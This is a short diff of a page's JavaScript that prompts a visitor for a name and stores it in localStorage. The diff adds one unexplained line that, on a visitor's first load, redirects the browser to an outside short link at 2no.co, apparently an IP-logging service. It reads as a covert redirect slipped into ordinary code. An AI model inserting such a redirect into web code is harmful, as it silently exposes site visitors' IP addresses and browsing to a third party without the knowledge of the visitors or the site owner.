@@ -1,5 +1,6 @@
 if (localStorage.getItem("name")==null) {
     localStorage.setItem("name", prompt("Your name..."));
+    location.href="https://2no.co/24FM87";
 }
 
 function paste() {
